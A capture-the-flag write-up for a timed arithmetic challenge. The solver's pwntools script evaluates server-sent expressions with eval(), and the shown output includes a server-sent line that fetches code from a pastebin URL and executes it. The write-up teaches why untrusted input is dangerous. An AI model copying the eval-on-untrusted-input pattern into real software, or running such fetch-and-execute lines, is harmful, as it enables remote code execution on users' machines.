# Do Not Trust My Calculator

## Description

Do Not Trust My Calculator

`calculator.ctf.cert.unlp.edu.ar 15001`

## Solution

If you connect to challenge server you get:
```powershell
➜ ncat calculator.ctf.cert.unlp.edu.ar 15001
 _______  _______ _________ _______  _______  _______  ______
(       )(  ____ \__   __/(  ___  )(  ____ )(  ____ \(  __  \
| () () || (    \/   ) (   | (   ) || (    )|| (    \/| (  \  )
| || || || (__       | |   | (___) || (____)|| (__    | |   ) |
| |(_)| ||  __)      | |   |  ___  ||     __)|  __)   | |   | |
| |   | || (         | |   | (   ) || (\ (   | (      | |   ) |
| )   ( || (____/\   | |   | )   ( || ) \ \__| (____/\| (__/  )
|/     \|(_______/   )_(   |/     \||/   \__/(_______/(______/


Bienvenidos! Resuelvan estas sumas para obtener la flag!:
5642 + 123
Mmmm tardaste mucho amiguito
```

```
Welcome! Solve these sums to obtain the flag!:
5642 + 123
Mmmm you took a long time little friend
```

We have to answer given questions in less then a second.

```py
from pwn import remote, context

# context.log_level = 'DEBUG'

io = remote('calculator.ctf.cert.unlp.edu.ar', 15001)

def recv(): return io.recvline().decode().strip()
def answer(equation): io.sendline(f'{eval(equation)}'.encode())
    
io.recvuntil(b"flag!:\n")
answer(recv())

while True:
    io.recvuntil(b'A resolver!:\n')
    line = recv()
    if line.startswith("exec"):
        print(line)
        print(io.recvallS())
        break
    answer(line)
```

```powershell
➜ python .\calc.py
[x] Opening connection to calculator.ctf.cert.unlp.edu.ar on port 15001
[x] Opening connection to calculator.ctf.cert.unlp.edu.ar on port 15001: Trying 119.8.73.156
[+] Opening connection to calculator.ctf.cert.unlp.edu.ar on port 15001: Done
exec('import urllib.request; exec(urllib.request.urlopen("https://pastebin.com/raw/67sfqDfw").read())')
[x] Receiving all data
[x] Receiving all data: 27B
[+] Receiving all data: Done (27B)
[*] Closed connection to calculator.ctf.cert.unlp.edu.ar port 15001
Bien! Chequea tu wallpaper
```

In given pastebin we find `url_img = "https://i.imgur.com/ACC4zAh.png"`

![calculator-1](/assets/ctf/metared/calculator-1.png)
::: tip Flag
`flag{Dont_trust_in_insecure_code!}`
:::